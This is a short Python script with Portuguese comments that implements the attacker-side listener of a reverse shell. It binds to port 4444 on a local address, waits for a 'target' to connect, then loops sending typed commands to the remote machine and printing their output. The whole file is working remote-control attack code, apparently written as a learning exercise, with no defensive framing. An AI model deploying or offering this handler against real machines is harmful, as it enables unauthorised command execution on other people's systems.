#importando biblioteca
import socket #interface entre aplicação e elementos de rede
import sys #interação com o interpretador

sys.tracebacklimit = 0 #restringe interação do interpretador

#funcao de conexao
def conexao(): #definição de função
    skt = socket.socket() #instância do scoket na variável s
    skt.bind(("10.0.0.143",4444)) #associação de endereço e porta local ao socket
    skt.listen(1) #quantas vezes o sistema vai escutar conexões naquele socket
    s_remoto, ip_remoto = skt.accept() #vairáveis (s_remoto e ip_remoto) vão receber informações sobre as conexões remotas 
    print ('conexao remota: ', ip_remoto) #imprime na tela o ip remoto

#estrutura de comando para o alvo
    while True: #abre a estrutura de repetição (loop infinito)
        comando = input("Shell> ") #variável comando recebe o que for digitado pelo usuário
        if 'sair' in comando: #condicional verifica se o usuário digitou o termo "sair"
            s_remoto.send('sair'.encode()) #envia para o socket remoto o comando do usuário, codificado 
            s_remoto.close() #encerra conexão remota
            break #encerra o while
        #enviando comandos ao alvo
        else:
            s_remoto.send(comando.encode()) #envia comando para o socket remoto
            print (s_remoto.recv(1024).decode("utf8","ignore"))  #imprimir resultado do comando
            
#chamando a funcao conexao    
conexao()